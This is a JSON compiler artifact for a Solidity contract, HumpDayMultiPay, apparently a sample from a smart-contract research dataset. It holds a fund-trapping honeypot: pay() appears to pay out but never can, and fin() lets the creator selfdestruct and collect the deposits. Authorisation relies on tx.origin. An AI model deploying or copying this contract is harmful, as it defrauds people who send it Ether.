{
  "contractName": "HumpDayMultiPay",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "pay",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fin",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005057600080fd5b5061018b806100606000396000f30060806040526004361061004b576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168062a369471461004d5780631b9265b814610064575b005b34801561005957600080fd5b5061006261006e565b005b61006c6100de565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff1614156100dc573273ffffffffffffffffffffffffffffffffffffffff16ff5b565b3073ffffffffffffffffffffffffffffffffffffffff16313410151561015d573273ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561015b573d6000803e3d6000fd5b505b5600a165627a7a72305820b0298f22afb361ace8f36b1ab01d1cebe983de752162fdec43c4cac6729e312f0029",
  "source": "\n\ncontract HumpDayMultiPay\n{\n    address O = tx.origin;\n\n    function() public payable {}\n\n    function pay() public payable {\n        if (msg.value >= this.balance) {\n            tx.origin.transfer(this.balance);\n        }\n    }\n    function fin() public {\n        if (tx.origin == O) {\n            selfdestruct(tx.origin);\n        }\n    }\n }",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x8fd1c78ed8b3de2a025373b2bbd820c03939f760/contracts/0x8fd1c78ed8b3de2a025373b2bbd820c03939f760.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:00:34.384Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}